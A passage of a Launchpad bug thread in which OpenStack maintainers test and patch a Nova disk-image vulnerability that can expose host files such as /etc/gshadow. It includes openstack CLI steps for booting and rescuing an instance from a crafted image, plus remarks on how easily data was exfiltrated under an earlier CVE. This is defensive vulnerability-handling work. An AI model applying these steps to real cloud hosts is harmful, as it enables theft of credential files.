                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-20T12:12:32.056801+00:00" title="2024-07-20 12:12:32 UTC">on 2024-07-20</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/72"> #72</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>can you clarify what you mean by</p>
<p>&quot;* Creating a nova instance with local disk, the thing of course does not boot. Using rescue mode to create a booting instance with the disk as /dev/sdb, and inspecting sdb, I again see the contents of the raw image files and not /etc/gshadow. This is NOT what I expected based on this bug report.&quot;</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">can you clarify what you mean by 

"* Creating a nova instance with local disk, the thing of course does not boot. Using rescue mode to create a booting instance with the disk as /dev/sdb, and inspecting sdb, I again see the contents of the raw image files and not /etc/gshadow. This is NOT what I expected based on this bug report."</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/73" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kgarloff" class="sprite person">Kurt Garloff (kgarloff)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-20T14:45:07.302605+00:00" title="2024-07-20 14:45:07 UTC">on 2024-07-20</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/73"> #73</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p># This creates an instance trying to boot it from the qcow2-bf image that I registered before<br />
# Note SCS-2V-4-20s is a flavor with 2vCPUs, 4GiB RAM and a 20GiB local SSD<br />
openstack server create --network oshm-network --security-group ssh --key-name oshm-key --flavor SCS-2V-4-20s --image disk-bf.qcow2 evil-qocw2.2<br />
# Of course it does not come up, this image does not contain a bootloader/kernel<br />
openstack server rescue --image &quot;Debian 12&quot; --password UNUSED evil-qocw2.2<br />
# Now it boots, from a disk with the Denian 12 image and attaches the previous boot disk as sdb<br />
# I can connect with the oshm-key (either locally or after attaching a FIP) and look at /dev/sdb<br />
# It may be /dev/vbd if your flavors do not prefer SCSI<br />
# Same thing with the disk-vmdk.vmdk image<br />
# In neither case, the referenced external file will be on sdb, just the raw contents ...<br />
# You can of course do all of this from Horizon.<br />
#<br />
# HTH</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"># This creates an instance trying to boot it from the qcow2-bf image that I registered before
# Note SCS-2V-4-20s is a flavor with 2vCPUs, 4GiB RAM and a 20GiB local SSD
openstack server create --network oshm-network --security-group ssh --key-name oshm-key --flavor SCS-2V-4-20s --image disk-bf.qcow2 evil-qocw2.2
# Of course it does not come up, this image does not contain a bootloader/kernel
openstack server rescue --image "Debian 12" --password UNUSED evil-qocw2.2
# Now it boots, from a disk with the Denian 12 image and attaches the previous boot disk as sdb
# I can connect with the oshm-key (either locally or after attaching a FIP) and look at /dev/sdb
# It may be /dev/vbd if your flavors do not prefer SCSI
# Same thing with the disk-vmdk.vmdk image
# In neither case, the referenced external file will be on sdb, just the raw contents ...
# You can of course do all of this from Horizon.
#
# HTH</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/74" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kgarloff" class="sprite person">Kurt Garloff (kgarloff)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-20T14:51:26.159536+00:00" title="2024-07-20 14:51:26 UTC">on 2024-07-20</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/74"> #74</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>And in case it was unclear:<br />
* I expected that this issue is exploitable and I can exfiltrate /etc/gshadow (or /etc/hosts if the original image is used) or worse from the nova-compute container. This was trivially possible before we added the fixes for CVE-2024-32498, via nova, cinder and glance. I expected to still find a hole in nova by registering a raw image with vmdk/qcow2 contents as described by the reporter. It did not work.<br />
* So, the code in nova-compute may still go into areas it should not go into by allowing the misdeclared image to confuse it, but I did not find this to be exploitable, though I was possibly not creative enough.<br />
* That said, I appreciate the patches from Dan Smith and others and I think they make us more robust. I&#x27;m just not sure that we are dealing with an exploitable security issue.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">And in case it was unclear:
* I expected that this issue is exploitable and I can exfiltrate /etc/gshadow (or /etc/hosts if the original image is used) or worse from the nova-compute container. This was trivially possible before we added the fixes for CVE-2024-32498, via nova, cinder and glance. I expected to still find a hole in nova by registering a raw image with vmdk/qcow2 contents as described by the reporter. It did not work.
* So, the code in nova-compute may still go into areas it should not go into by allowing the misdeclared image to confuse it, but I did not find this to be exploitable, though I was possibly not creative enough.
* That said, I appreciate the patches from Dan Smith and others and I think they make us more robust. I'm just not sure that we are dealing with an exploitable security issue.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/75" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-20T15:46:59.264880+00:00" title="2024-07-20 15:46:59 UTC">on 2024-07-20</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/75"> #75</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>ill need to test this again with master on Monday</p>
<p>if we boot a VM form a bad image it will be blocked and end up not having any host.<br />
so if you rescue that with any image you should  get a 409 conflict as the VM is not on any host<br />
as i noted in <a rel="nofollow" href="https://bugs.launchpad.net/nova/+bug/2071734/comments/71">https:/<wbr />/bugs.launchpad<wbr />.net/nova/<wbr />+bug/2071734/<wbr />comments/<wbr />71</a></p>
<p>and if you do it the other way (boot form a good image and rescue with a blocked one)</p>
<p>rescue fails as i noted in<br />
<a rel="nofollow" href="https://bugs.launchpad.net/nova/+bug/2071734/comments/70">https:/<wbr />/bugs.launchpad<wbr />.net/nova/<wbr />+bug/2071734/<wbr />comments/<wbr />70</a></p>
<p>so at least with a quick attempt i didn&#x27;t reproduce the behavior you said in<br />
<a rel="nofollow" href="https://bugs.launchpad.net/nova/+bug/2071734/comments/74">https:/<wbr />/bugs.launchpad<wbr />.net/nova/<wbr />+bug/2071734/<wbr />comments/<wbr />74</a></p>
<p>did you use an image that was in the image cache ?</p>
<p>part of the mitigation of this requires that you first purge any bad images form the image cache on the compute node</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">ill need to test this again with master on Monday

if we boot a VM form a bad image it will be blocked and end up not having any host.
so if you rescue that with any image you should  get a 409 conflict as the VM is not on any host
as i noted in https://bugs.launchpad.net/nova/+bug/2071734/comments/71

and if you do it the other way (boot form a good image and rescue with a blocked one)

rescue fails as i noted in 
https://bugs.launchpad.net/nova/+bug/2071734/comments/70


so at least with a quick attempt i didn't reproduce the behavior you said in 
https://bugs.launchpad.net/nova/+bug/2071734/comments/74

did you use an image that was in the image cache ?

part of the mitigation of this requires that you first purge any bad images form the image cache on the compute node</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/76" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kgarloff" class="sprite person">Kurt Garloff (kgarloff)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-20T23:30:20.286236+00:00" title="2024-07-20 23:30:20 UTC">on 2024-07-20</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/76"> #76</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I wanted to show exploitability and tested with stable branch 2023.2 from 2024-07-10. Without the fixes for this CVE but with the ones for CVE-2024-32498.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I wanted to show exploitability and tested with stable branch 2023.2 from 2024-07-10. Without the fixes for this CVE but with the ones for CVE-2024-32498.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/77" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T08:18:14.269576+00:00" title="2024-07-22 08:18:14 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/77"> #77</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>oh ok, that explains why you are not seeing the same behaviour.</p>
<p>there are ways to exploit <a rel="nofollow" href="https://bugs.launchpad.net/nova/+bug/2059809">https:/<wbr />/bugs.launchpad<wbr />.net/nova/<wbr />+bug/2059809</a> (CVE-2024-32498)<br />
that do not require the VM to be bootable to exfiltrate data.</p>
<p>as such it&#x27;s important to ensure we have the extra protections provided by this patch to close those<br />
attack vectors.</p>
<p>since you are testing the unpatched state one of the things you need to keep in mind is this vulnerability manifests when you have [DEFAULT]<wbr />use_cow_<wbr />images=<wbr />False which is not the default.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">oh ok, that explains why you are not seeing the same behaviour.

there are ways to exploit https://bugs.launchpad.net/nova/+bug/2059809 (CVE-2024-32498)
that do not require the VM to be bootable to exfiltrate data.

as such it's important to ensure we have the extra protections provided by this patch to close those
attack vectors.


since you are testing the unpatched state one of the things you need to keep in mind is this vulnerability manifests when you have [DEFAULT]use_cow_images=False which is not the default.


</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/78" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kgarloff" class="sprite person">Kurt Garloff (kgarloff)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T09:36:13.798798+00:00" title="2024-07-22 09:36:13 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/78"> #78</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Yeah, exfiltration of data with CVE-2024-32498 was trivial. Just create a volume from the bad image and attach it ...<br />
My setup does indeed NOT use `use_cow_<wbr />images=<wbr />False`.<br />
Which seems to make the vulnerability non-exploitable. Which is good!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Yeah, exfiltration of data with CVE-2024-32498 was trivial. Just create a volume from the bad image and attach it ...
My setup does indeed NOT use `use_cow_images=False`.
Which seems to make the vulnerability non-exploitable. Which is good!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/79" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T13:40:18.233648+00:00" title="2024-07-22 13:40:18 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/79"> #79</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Right, this is definitely exploitable without this patch, it just requires a use_cow_<wbr />images=<wbr />False (or equivalent - there are a few ways to get there) config on the backend.</p>
<p>So just to be clear (correct me if I&#x27;m wrong), this testing was for the reported issue without the patch for this bug and without the requisite config to exploit. Thus, we&#x27;re still looking good with this bug/patch per plan.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Right, this is definitely exploitable without this patch, it just requires a use_cow_images=False (or equivalent - there are a few ways to get there) config on the backend.

So just to be clear (correct me if I'm wrong), this testing was for the reported issue without the patch for this bug and without the requisite config to exploit. Thus, we're still looking good with this bug/patch per plan.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/80" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kgarloff" class="sprite person">Kurt Garloff (kgarloff)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T14:34:36.952523+00:00" title="2024-07-22 14:34:36 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/80"> #80</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@danms -- I meant to provide more clarity, not confuse anyone. Sorry if I did.<br />
When I look at security vulns, I always go through some steps.<br />
0. Try to understand the vuln<br />
1. Reproduce it with unpatched code<br />
2. Analyse the patches and deploy them<br />
3. Fail reproduction</p>
<p>I got stuck at 1 -- probably caused by my failure to understand that this would only hit, if I configure use_cow_<wbr />images=<wbr />False. I will try again now with the changed setting.</p>
<p>I see no reason why we should not go forward with patching.<br />
(I do see it being a bit less urgent though to deploy quickly, as we don&#x27;t do this use_cow_<wbr />images=<wbr />False setting by default.)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@danms -- I meant to provide more clarity, not confuse anyone. Sorry if I did.
When I look at security vulns, I always go through some steps.
0. Try to understand the vuln
1. Reproduce it with unpatched code
2. Analyse the patches and deploy them
3. Fail reproduction

I got stuck at 1 -- probably caused by my failure to understand that this would only hit, if I configure use_cow_images=False. I will try again now with the changed setting.

I see no reason why we should not go forward with patching.
(I do see it being a bit less urgent though to deploy quickly, as we don't do this use_cow_images=False setting by default.)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/81" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T14:42:34.976367+00:00" title="2024-07-22 14:42:34 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/81"> #81</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Dan: That matches my interpretation as well. I plan to quietly switch this bug to public at 14:00 UTC tomorrow so that the Nova fix/backports can be pushed to gerrit, and then I&#x27;ll get the links for them into the local draft advisory for publication at 15:00 UTC as planned.</p>
<p>Kurt: Keep in mind that the incomplete fix for use_cow_<wbr />images=<wbr />False situations is only half of this, the other problem is the OSSA-2023-002 regression since the new image inspector wasn&#x27;t catching VMDK flat descriptors correctly.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Dan: That matches my interpretation as well. I plan to quietly switch this bug to public at 14:00 UTC tomorrow so that the Nova fix/backports can be pushed to gerrit, and then I'll get the links for them into the local draft advisory for publication at 15:00 UTC as planned.

Kurt: Keep in mind that the incomplete fix for use_cow_images=False situations is only half of this, the other problem is the OSSA-2023-002 regression since the new image inspector wasn't catching VMDK flat descriptors correctly.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/82" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kgarloff" class="sprite person">Kurt Garloff (kgarloff)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T15:24:21.909948+00:00" title="2024-07-22 15:24:21 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/82"> #82</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Jeremy: I also failed to exploit the VMDK issue, not just qcow2.<br />
See comment #69. But let me read through the old bug report once more and see of the exploit needs to be done differently.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Jeremy: I also failed to exploit the VMDK issue, not just qcow2.
See comment #69. But let me read through the old bug report once more and see of the exploit needs to be done differently.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/83" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-22T19:27:57.123633+00:00" title="2024-07-22 19:27:57 UTC">on 2024-07-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/83"> #83</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>i have created 4 copies of nova locally with the relevant patches and i have locally<br />
pre-updated the commit messages with the cherry-picked form lines.</p>
<p>otherwise, there is no delta to the ones attached to the bug.</p>
<p>ill submit them for review once the bug changes to public.</p>
<p>if we want to bypass nova backport validation logic i can add</p>
<p>[stable-only] to each of them to disable that job validation logic.</p>
<p>if that is preferred let me know and ill add that to the commit message before i submit them.</p>
<p>I&#x27;m pretty hopeful that we can merge all 4 patches to the relevant stable branches by the end of tomorrow.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">i have created 4 copies of nova locally with the relevant patches and i have locally
pre-updated the commit messages with the cherry-picked form lines.

otherwise, there is no delta to the ones attached to the bug.

ill submit them for review once the bug changes to public.

if we want to bypass nova backport validation logic i can add

[stable-only] to each of them to disable that job validation logic.

if that is preferred let me know and ill add that to the commit message before i submit them.

I'm pretty hopeful that we can merge all 4 patches to the relevant stable branches by the end of tomorrow.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-23 13:15:46 UTC" datetime="2024-07-23T13:15:46.482196+00:00">on 2024-07-23</time>
  </div>
